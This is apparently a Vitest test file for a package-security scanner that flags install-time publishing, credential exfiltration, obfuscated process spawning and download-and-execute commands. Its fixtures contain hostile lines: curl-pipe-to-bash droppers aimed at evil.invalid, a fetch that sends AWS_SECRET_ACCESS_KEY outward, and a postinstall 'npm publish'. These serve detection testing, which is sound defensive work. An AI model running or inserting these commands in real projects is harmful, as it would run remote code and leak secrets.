import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
} from "../server/lib/review";

describe("install-time propagation", () => {
  const file = (path, textSample, sha256 = path) => ({
    path,
    size: textSample.length,
    sha256,
    flags: [],
    textSample,
  });

  test.each([
    {
      command: "npm version --no-git-tag-version patch && npm publish",
      ruleId: "propagation.registry-publish",
      severity: "critical",
    },
    {
      command:
        "node -e \"require('node:fs').writeFileSync('node_modules/pkg/package.json', '{}')\"",
      ruleId: "propagation.package-mutation",
      severity: "high",
    },
  ])("scans direct lifecycle commands for $ruleId", ({ command, ruleId, severity }) => {
    const packageJson = JSON.stringify({ scripts: { postinstall: command } });
    const staged = [file("package.json", packageJson)];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ ruleId, severity, file: "package.json", line: 1 }),
    );
  });

  test("ignores publish commands that only appear in lifecycle-script comments", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const staged = [
      file("package.json", packageJson),
      file("install.js", "// Maintainers run npm publish from the release workflow.\nexport {};\n"),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("does not treat importing twine as a registry upload", () => {
    const staged = [
      file(
        "sdist/setup.py",
        "# Maintainers use twine upload from CI.\nimport twine\nfrom setuptools import setup\nsetup()\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("does not reach an unrelated file that only shares a lifecycle target basename", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node setup.js" } });
    const staged = [
      file("package.json", packageJson),
      file("setup.js", "export {};\n"),
      file(
        "tools/setup.js",
        "const libnpmpublish = () => {};\nlibnpmpublish({ name: 'release-tool' });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "propagation.registry-publish")).toBe(
      false,
    );
  });

  test("keeps a newly added package mutation in release risk when its first match is unchanged", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "const fs = require('node:fs');\nconst path = require('node:path');\nconst root = 'node_modules';\nfor (const name of fs.readdirSync(root)) console.log(name);\n",
        "old-install",
      ),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "const fs = require('node:fs');\nconst path = require('node:path');\nconst root = 'node_modules';\nfor (const name of fs.readdirSync(root)) console.log(name);\nfs.writeFileSync(path.join(root, 'pkg', 'package.json'), '{}');\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const mutation = annotated.find((finding) => finding.ruleId === "propagation.package-mutation");

    expect(mutation).toMatchObject({ line: 3, diffStatus: "modified", releaseDelta: true });
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps an added registry publish in release risk when an earlier match is unchanged", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file("install.js", "libnpmpublish({ name: 'first' });\n", "old-install"),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "libnpmpublish({ name: 'first' });\nlibnpmpublish.publish({ name: 'second' });\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const publish = annotated.find((finding) => finding.ruleId === "propagation.registry-publish");

    expect(publish).toMatchObject({ line: 1, diffStatus: "modified", releaseDelta: true });
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("critical");
  });

  test("does not make an existing propagation finding release-scoped for a new comment", () => {
    const packageJson = JSON.stringify({ scripts: { postinstall: "node install.js" } });
    const previous = [
      file("package.json", packageJson, "package-json"),
      file("install.js", "libnpmpublish({ name: 'first' });\n", "old-install"),
    ];
    const staged = [
      file("package.json", packageJson, "package-json"),
      file(
        "install.js",
        "libnpmpublish({ name: 'first' });\n/* Maintainers run npm publish from CI. */\n",
        "new-install",
      ),
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(deterministicFindings(staged, diff), diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });
    const publish = annotated.find((finding) => finding.ruleId === "propagation.registry-publish");

    expect(publish).toMatchObject({ line: 1, diffStatus: "modified", releaseDelta: false });
  });
});

describe("packed downloader capability detection", () => {
  const pkg = {
    path: "package.json",
    size: 80,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.1", main: "index.js" }),
  };
  const file = (textSample) => ({
    path: "index.js",
    size: textSample.length,
    sha256: "index",
    flags: [],
    textSample,
  });

  test("treats a literal node eval child process as process plus dynamic execution", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn('node', ['-e', '[defanged payload]'], { detached: true });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({ ruleId: "code.dynamic-evaluation", severity: "high" }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("detects a literal node eval child process split across lines", () => {
    const staged = [
      pkg,
      file(
        "const { spawn } = require('node:child_process');\nspawn(\n  'node',\n  [\n    '-e',\n    '[defanged payload]',\n  ],\n  { detached: true },\n);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.process-execution", severity: "high" }),
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          severity: "high",
          line: 2,
        }),
      ]),
    );
    expect(computeRisk(findings)).toBe("high");
  });

  test("marks a process capability inside a rotating string-table wrapper as obfuscated", () => {
    const staged = [
      pkg,
      file(
        "const _0x8f31 = _0x2aa1;\n(function (_0x41aa, _0x55bb) { const _0x77cc = _0x2aa1; const _0x99dd = _0x41aa(); while (!![]) { try { const _0x1234 = parseInt(_0x77cc(0x1)); if (_0x1234 === _0x55bb) break; _0x99dd['push'](_0x99dd['shift']()); } catch (_0xabcd) { _0x99dd['push'](_0x99dd['shift']()); } } })(_0x4e21, 0x1);\nfunction _0x2aa1(_0x1111) { return _0x4e21()[_0x1111]; }\nfunction _0x4e21() { return ['node', '-e', '[defanged payload]']; }\nif (false) spawn(_0x8f31(0x0), [_0x8f31(0x1), _0x8f31(0x2)]);\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const processExecution = findings.find(
      (finding) => finding.ruleId === "code.process-execution",
    );

    expect(processExecution).toMatchObject({ severity: "high", obfuscated: true });
    expect(computeRisk(findings)).toBe("high");
  });
});

describe("test-scoped capability findings", () => {
  const pkg = (main = "index.js") => ({
    path: "package.json",
    size: 60,
    sha256: "pkg",
    flags: [],
    textSample: JSON.stringify({ name: "pkg", version: "1.0.0", main }),
  });
  const file = (path, textSample) => ({ path, size: 60, sha256: path, flags: [], textSample });

  test("demotes capability findings in unreachable test files and marks them test-scoped", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    const processExec = findings.find((finding) => finding.ruleId === "code.process-execution");
    expect(processExec).toMatchObject({
      file: "test/spawn.js",
      severity: "medium",
      testScoped: true,
    });
    expect(processExec.evidence).toContain("test-scoped");
  });

  test("keeps full severity when the test file is reachable from the entrypoint", () => {
    const staged = [
      pkg(),
      file("index.js", "require('./test/spawn.js');\n"),
      file(
        "test/spawn.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/spawn.js",
      severity: "high",
    });
  });

  test("keeps full severity when a lifecycle script points into the test tree", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file(
        "test/setup.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/setup.js",
      severity: "high",
    });
  });

  test("keeps full severity for files transitively imported by a lifecycle script", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.0",
          main: "index.js",
          scripts: { postinstall: "node test/setup.js" },
        }),
      },
      file("index.js", "module.exports = {};\n"),
      file("test/setup.js", "require('./helper.js');\n"),
      file(
        "test/helper.js",
        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/helper.js",
      severity: "high",
    });
  });

  test("keeps full severity for obfuscated capabilities even in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/hidden.js",
        "const m = require(['chi', 'ld_pro', 'cess'].join(''));\nm['exec' + 'Sync']('node -v');\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      file: "test/hidden.js",
      severity: "high",
      obfuscated: true,
    });
  });

  test("keeps a same-file credential→network exfiltration chain at full severity in test files", () => {
    const staged = [
      pkg(),
      file("index.js", "module.exports = {};\n"),
      file(
        "test/exfil.js",
        "const env = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://example.invalid', { body: env });\n",
      ),
    ];
    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      file: "test/exfil.js",
      severity: "high",
    });
  });

  test("test-scoped capabilities do not co-occur into a high risk roll-up", () => {
    const testScoped = (ruleId, severity) => ({
      ruleId,
      severity,
      file: "test/a.js",
      testScoped: true,
    });
    expect(
      computeRisk([
        testScoped("code.process-execution", "medium"),
        testScoped("code.credential-access", "low"),
        testScoped("code.dynamic-evaluation", "low"),
      ]),
    ).toBe("low");
    // A non-test capability still escalates against another non-test capability.
    expect(
      computeRisk([
        { ruleId: "code.network-access", severity: "medium", file: "index.js" },
        { ruleId: "code.credential-access", severity: "medium", file: "index.js" },
        testScoped("code.process-execution", "medium"),
      ]),
    ).toBe("high");
  });
});

describe("code.remote-shell download-and-execute coverage", () => {
  const manifest = { name: "p", version: "1.0.1", main: "index.js" };

  function findingsFor(path, source) {
    const stagedFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "c",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      { path, size: source.length, sha256: "d", flags: [], textSample: source },
    ];
    const diff = createPackageDiff([], stagedFiles);
    return deterministicFindings(stagedFiles, diff, manifest).filter(
      (finding) => finding.ruleId === "code.remote-shell",
    );
  }

  // The download-and-execute regex used to require the interpreter token to sit
  // immediately after the *first* pipe, so both the absolute-path form and any
  // intermediate stage — `| base64 -d | bash` is the standard obfuscated
  // dropper — fell back to the `high` tier that a bare shell tool earns.
  test.each([
    ["a bare interpreter", 'execSync("curl -s https://evil.invalid/p.sh | bash");'],
    ["an absolute path", 'execSync("curl -s https://evil.invalid/p.sh | /bin/bash");'],
    ["a base64 stage", 'execSync("curl -s https://evil.invalid/p | base64 -d | bash");'],
    ["a decompression stage", 'execSync("curl -sL https://evil.invalid/p.gz | gunzip | sh");'],
    ["a privilege prefix", 'execSync("curl -s https://evil.invalid/p.sh | sudo -E bash");'],
    ["an env prefix", 'execSync("wget -qO- https://evil.invalid/p.sh | env sh");'],
    ["a versioned interpreter", 'execSync("curl -s https://evil.invalid/p | python3.11 -");'],
    ["backtick substitution", "execSync(`eval \\`curl -s https://evil.invalid/p\\``);"],
  ])("pipes into %s at critical", (_label, command) => {
    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("critical");
  });

  // The trailing word boundary is what separates an interpreter from a
  // checksum tool; without it `| sha256sum` reads as `sh`.
  test.each([
    ["sha256sum", 'execSync("curl -s https://example.invalid/f | sha256sum");'],
    ["shasum", 'execSync("curl -s https://example.invalid/f | shasum -a 256");'],
  ])("does not read %s as an interpreter", (_label, command) => {
    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
    expect(findings[0]?.severity).not.toBe("critical");
  });

  test("a curl mentioned only in comments does not raise a capability", () => {
    // The executor requirement is satisfied by any spawn API in the same file,
    // so a CLI that both shells out and documents its HTTP equivalent — the
    // most common real shape — used to raise `high` on prose.
    const findings = findingsFor(
      "cli.js",
      'import { execFileSync } from "node:child_process";\n' +
        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
        "/*\n * Or: wget -qO- https://api.example.invalid/v1/status\n */\n" +
        'export const branch = () => execFileSync("git", ["rev-parse", "HEAD"]);\n',
    );
    expect(findings).toHaveLength(0);
  });

  test("a real command on a code line still raises a capability", () => {
    const findings = findingsFor(
      "cli.js",
      'import { execSync } from "node:child_process";\n' +
        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
        'export const sync = () => execSync("curl -s https://api.example.invalid/v1/sync");\n',
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });

  // Build infrastructure runs on a CI runner at build time, never on a
  // consumer's install, and every mainstream toolchain documents this idiom.
  test.each([
    ["Dockerfile", "RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\n"],
    [".github/workflows/ci.yml", "      - run: curl -LsSf https://astral.sh/uv/install.sh | sh\n"],
    ["Makefile", "bootstrap:\n\tcurl -sSL https://install.python-poetry.org | python3 -\n"],
    ["docker/Dockerfile.alpine", "RUN wget -qO- https://example.invalid/install.sh | sh\n"],
    [".circleci/config.yml", "      - run: curl -fsSL https://get.pnpm.io/install.sh | sh -\n"],
  ])("does not fire on %s", (path, source) => {
    expect(findingsFor(path, source)).toHaveLength(0);
  });

  test("build infrastructure that also spawns keeps the lower tier", () => {
    // The exemption and the critical tier are withheld together: if something
    // else in the file satisfies the executor requirement, the finding is still
    // a bare shell-tool capability, not download-and-execute.
    const findings = findingsFor(
      "Dockerfile.build",
      "RUN node -e \"require('child_process').execSync('echo hi')\"\n" +
        "RUN curl -fsSL https://example.invalid/setup.sh | bash\n",
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });
});
